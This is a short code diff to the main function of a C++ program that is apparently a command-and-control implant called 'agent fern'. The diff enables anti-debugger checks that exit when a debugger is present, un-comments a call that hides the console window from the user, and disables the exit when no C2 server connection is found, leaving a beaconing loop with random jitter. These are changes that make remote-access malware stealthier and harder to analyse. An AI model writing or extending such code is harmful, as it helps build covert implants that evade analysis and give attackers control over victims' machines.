@@ -37,7 +37,7 @@ std::vector<std::string> split_string(const std::string &s, const std::string &d
 
 
 int main() {
-    /*
+
     if(DebuggerPresence()){
         exit(1);
     }
@@ -46,9 +46,8 @@ int main() {
         exit(2);
     }
 
-    */
     //Hiding console from user
-    //ShowWindow(GetConsoleWindow(), SW_HIDE);
+    ShowWindow(GetConsoleWindow(), SW_HIDE);
     //Initializing agent
     agent fern;
     //register string, send to tell us that the agent is alive and working
@@ -68,10 +67,10 @@ int main() {
     std::cout << implant_id << "\n";
     //vector to hold tasks to execute
     std::vector<std::string> tasks;
-    if (implant_id.empty()) {
-        std::cout << "[-]No connection to C2 server. Existing!\n";
-        exit(1);
-    }
+    //if (implant_id.empty()) {
+    //    std::cout << "[-]No connection to C2 server. Existing!\n";
+    //    exit(1);
+    //}
     while (true) {
         try {
             int jitter = getRandom(250, 2500);
